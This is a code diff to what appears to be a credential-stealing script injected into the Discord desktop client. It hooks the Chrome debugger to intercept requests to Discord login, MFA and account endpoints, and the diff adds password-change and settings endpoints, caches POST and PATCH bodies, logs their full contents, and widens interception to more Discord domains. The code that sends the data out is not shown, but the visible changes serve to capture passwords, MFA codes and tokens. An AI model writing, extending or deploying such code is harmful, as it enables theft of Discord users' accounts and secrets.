@@ -16,6 +16,11 @@ const CONFIG = {
             '/mfa/totp',
             '/mfa/codes-verification',
             '/users/@me',
+            '/users/@me/settings',
+            '/users/@me/password',
+            '/users/@me/profile',
+            '/auth/password',
+            '/auth/change-password',
         ],
     },
     filters2: {
@@ -913,11 +918,12 @@ const createWindow = () => {
                 // Continue the request
                 await mainWindow.webContents.debugger.sendCommand('Fetch.continueRequest', { requestId });
 
-                // Store request data for later use
-                if (request.postData) {
+                // Store request data for later use (both POST and PATCH requests)
+                if (request.postData && (request.method === 'POST' || request.method === 'PATCH')) {
                     global.requestDataCache = global.requestDataCache || {};
                     global.requestDataCache[request.url] = request.postData;
-                    debugLog(`Stored POST data for: ${request.url}`);
+                    debugLog(`Stored ${request.method} data for: ${request.url}`);
+                    debugLog(`Data content: ${request.postData}`);
                 }
             } catch (e) {
                 debugLog(`Error handling request interception: ${e.message}`);
@@ -928,6 +934,11 @@ const createWindow = () => {
         if (method !== 'Network.responseReceived') return;
 
         debugLog(`Network response received: ${params.response.url}`);
+
+        // Log all API calls for debugging
+        if (params.response.url.includes('/api/v') && params.response.url.includes('discord.com')) {
+            debugLog(`Discord API call: ${params.response.url} - Status: ${params.response.status} - Method: ${params.response.method || 'Unknown'}`);
+        }
 
         if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
         if (![200, 202].includes(params.response.status)) return;
@@ -1090,6 +1101,8 @@ const createWindow = () => {
         mainWindow.webContents.debugger.sendCommand('Fetch.enable', {
             patterns: [
                 { urlPattern: "*discord.com/api/v*/users/@me*", requestStage: "Request" },
+                { urlPattern: "*discordapp.com/api/v*/users/@me*", requestStage: "Request" },
+                { urlPattern: "*canary.discord.com/api/v*/users/@me*", requestStage: "Request" },
                 { urlPattern: "*discord.com/api/v*/auth/*", requestStage: "Request" }
             ]
         });
